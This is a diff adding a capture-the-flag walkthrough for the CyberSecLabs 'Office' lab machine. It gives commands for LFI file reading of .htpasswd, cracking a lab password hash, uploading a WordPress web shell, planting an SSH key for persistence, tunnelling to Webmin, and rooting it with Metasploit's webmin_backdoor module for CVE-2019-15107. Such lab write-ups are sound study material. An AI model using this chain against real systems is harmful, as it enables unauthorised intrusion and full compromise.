@@ -1,5 +1,6 @@
 # CyberSecLabs : Office 
 
+```CVE-2019-15107```
 
 ```zsh
 nmap -sC -sV -p 22,80,443 172.31.1.3
@@ -44,4 +45,68 @@ Subdomain finding:
 wfuzz -c -f sub-fighter -w /root/SecLists/Discovery/DNS/fierce-hostlist.txt  -u "http://office.csl" -H "Host: FUZZ.office.
 csl" -t 42 --hh 32240
 ```
+
+Get subdomain :```forum.office.csl```
+
+Get the hints that there is ```port forwarding```
+
+Dirsearch it: to find ```office.csl/wp-login.php```
+
+In forums there is a LFI from ```forum.office.csl/chatlogs/chatlogs.php?file=chatlog.txt```
+
+fuzz it using Seclists - Jhaddix list:
+
+```zsh
+python3 dirsearch/dirsearch.py -u http://forum.office.csl/chatlogs/chatlogs.php\?file\= -w /root/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt  -e * -R 3
+```
+```[04:08:07] 403 -  281B  - /.htpasswd```
+
+Use LFI payload ../.htpasswd and 
+get a hash for dwight
+
+```dwight:$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/```
+
+Crack it
+```zsh
+john hash.txt /usr/share/wordlists/rockyou.txt
+```
+```dwight:cowboys1```
+
+Login in wordpress. Upload file using wordpress filemanager. Get a shell. 
+
+Then ```sudo -u dwight /bin/bash/```
+
+on your kali machine
+```zsh
+ssh-keygen
+```
+cat id_rsa.pub > authorized_keys
+
+wget this to dwights .ssh folder
+
+And now ssh as dwight
+
+```
+ssh -i id_rsa dwight@172.31.3.1 
+```
+
+in my nmap and winpeas and linpeas result I had seen 10000 port.
+I tried to connect to using and grab the banner, it was minserv ---> basically webmin
+
+SSH Tunneling:
+``` ssh -i id_rsa -L 7000:127.0.0.1:10000 -N -f dwight@172.31.3.1```
+
+https://linuxize.com/post/how-to-setup-ssh-tunneling/
+
+Now go to localhost:7000 and you can access the webmin site.
+
+go to msfconsole and search webmin
+
+Get this module:
+
+```exploit/linux/http/webmin_backdoor```
+
+set LHOST as your tun0, since you have done tunneling RHOST is 127.0.0.1 and the RPORT is 7000
+
+exploit and you will have shell as root.
 
